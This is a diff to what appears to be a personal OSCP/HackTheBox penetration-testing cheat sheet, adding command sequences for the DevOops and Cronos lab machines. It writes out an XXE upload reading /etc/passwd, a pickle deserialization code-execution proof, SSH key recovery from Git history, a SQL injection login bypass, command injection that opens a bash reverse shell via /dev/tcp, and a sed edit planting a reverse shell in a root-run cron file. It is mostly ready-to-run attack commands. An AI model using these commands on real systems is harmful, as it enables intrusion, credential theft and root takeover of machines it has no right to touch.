@@ -216,6 +216,34 @@ chmod 600 $KeyFile
 ssh-keygen -y -f $KeyFile
 ```
 
+### Multipart XML upload, Python pickle, and Git-history credentials
+
+```bash
+# Preserve the form and confirm the multipart field before testing XXE
+boxset UploadURL "http://$BoxIP:$WebPort/upload"
+boxset FileField "file"
+curl -sS "$UploadURL" | tee "$BoxDir/loot/upload.txt"
+curl -sS -F "$FileField=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
+  "$UploadURL" | tee "$BoxDir/loot/xxe-passwd.txt"
+
+# Source-driven pickle proof: match the endpoint decoder and start with id
+boxset PickleURL "http://$BoxIP:$WebPort/newpost"
+Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"
+curl -sS -X POST --data-binary "$Payload" \
+  -H 'Content-Type: application/octet-stream' "$PickleURL" \
+  | tee "$BoxDir/loot/pickle-id.txt"
+
+# Search every reachable Git commit and save a historical blob privately
+git -C "$GitRepo" log --oneline --all
+git -C "$GitRepo" show "$Commit:$HistoryPath" > "$HistoryKeyFile"
+chmod 600 "$HistoryKeyFile"
+ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
+```
+
+Read the response for reflected `/etc/passwd` content, `uid=` from the pickle proof, and a successful `ssh-keygen` validation. Keep key contents and authentication material in private loot.
+
+Seen in [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]].
+
 ### SQLI
 
 ```bash
@@ -436,6 +464,54 @@ grep malicious.js $BoxDir/loot/callback.log
 ```
 
 <!-- TODO --> <!-- Add concise SSRF and IDOR command patterns. -->
+### CRONOS: AXFR, VIRTUAL HOST, SQLI, COMMAND INJECTION, AND ROOT CRON
+
+~~~bash
+# Discover hostnames from a DNS zone transfer
+dig axfr "$Domain" @"$BoxIP"
+
+# Test a confirmed virtual host without changing /etc/hosts
+curl -sSI --resolve "$FQDN:$WebPort:$BoxIP" "http://$FQDN/"
+
+# Submit a manually reviewed SQL injection authentication test
+curl -sS -i -c "$CookieFile" -X POST \
+  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
+  --data-urlencode "username=admin' OR '1'='1' -- -" \
+  --data-urlencode "password=x" \
+  "http://$AdminFQDN:$WebPort/"
+
+# Prove command injection before requesting a callback
+curl -sS -b "$CookieFile" \
+  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
+  --data-urlencode "command=ping -c 1" \
+  --data-urlencode "host=127.0.0.1;id" \
+  "http://$AdminFQDN:$WebPort/welcome.php"
+
+# Receive the web callback
+nc -lvnp "$Port"
+curl -sS --max-time 10 -b "$CookieFile" \
+  --resolve "$AdminFQDN:$WebPort:$BoxIP" \
+  --data-urlencode "command=ping -c 1" \
+  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" \
+  "http://$AdminFQDN:$WebPort/welcome.php" >/dev/null
+
+# Confirm a root-run cron target and preserve its original bytes
+cat /etc/crontab
+ls -la /var/www/laravel/artisan
+cp -p /var/www/laravel/artisan /tmp/artisan.backup
+
+# Generate the target-side edit locally so the callback address is expanded on Kali
+printf "sed -i '2a system(\"bash -c '\\''bash -i >& /dev/tcp/%s/%s 0>&1'\\''\");' /var/www/laravel/artisan\n" "$LocalIP" "$Port2"
+php -l /var/www/laravel/artisan
+
+# Restore only after the root proof, then verify syntax and close listeners
+cp -p /tmp/artisan.backup /var/www/laravel/artisan
+rm -f /tmp/artisan.backup
+php -l /var/www/laravel/artisan
+ss -ltnp | grep -E ":$Port|:$Port2" || true
+~~~
+
+The important controls are manual SQLi confirmation, an id proof before the callback, a backup before editing the scheduled file, and restoration after the root proof.
 <!-- TODO --> <!-- Add PostgreSQL COPY, MSSQL xp_cmdshell, MySQL file-write, and blind SQLi command patterns. -->
 
 ## 5. FOOTHOLD: PUBLIC EXPLOITS
@@ -546,7 +622,9 @@ nc -lvnp $Lport
 nc -lnvp $Lport
 sudo nc -lvnp $Lport
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Ctrl+Z, then: stty raw -echo; fg
+# Ctrl+Z, then: 
+stty raw -echo; fg
+# Press Enter twice
 export TERM=xterm
 stty rows 50 columns 200
 
